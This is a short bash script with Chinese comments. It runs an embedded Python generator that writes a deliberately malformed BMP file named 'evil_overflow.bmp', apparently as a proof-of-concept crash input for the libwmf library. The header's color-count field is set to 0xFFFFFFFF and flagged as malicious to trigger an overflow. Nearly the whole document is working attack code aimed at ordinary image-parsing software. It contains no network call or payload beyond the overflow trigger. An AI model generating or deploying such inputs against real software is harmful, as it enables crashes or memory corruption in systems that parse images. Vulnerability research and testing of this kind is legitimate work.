#!/bin/bash
# 在WSL中运行此脚本生成恶意BMP文件

cd /mnt/c/Users/18320/Desktop/新农计划/libwmf_complete_package

python3 << 'EOF'
import struct

def create_evil_bmp(filename):
    # BMP File Header (14 bytes)
    bmp_signature = b'BM'
    file_size = struct.pack('<I', 1000)
    reserved = struct.pack('<I', 0)
    data_offset = struct.pack('<I', 54)

    # BMP Info Header (40 bytes)
    header_size = struct.pack('<I', 40)
    width = struct.pack('<i', 10)
    height = struct.pack('<i', 10)
    planes = struct.pack('<H', 1)
    bits_per_pixel = struct.pack('<H', 8)
    compression = struct.pack('<I', 0)
    image_size = struct.pack('<I', 100)
    x_pixels_per_meter = struct.pack('<i', 0)
    y_pixels_per_meter = struct.pack('<i', 0)
    number_colors = struct.pack('<I', 0xFFFFFFFF)  # MALICIOUS
    important_colors = struct.pack('<I', 0)

    bmp_data = (
        bmp_signature + file_size + reserved + data_offset +
        header_size + width + height + planes + bits_per_pixel +
        compression + image_size + x_pixels_per_meter +
        y_pixels_per_meter + number_colors + important_colors
    )
    bmp_data += b'\x00' * 100

    with open(filename, 'wb') as f:
        f.write(bmp_data)

    print(f"[+] Created: {filename}")

create_evil_bmp('evil_overflow.bmp')
EOF

echo "Done!"
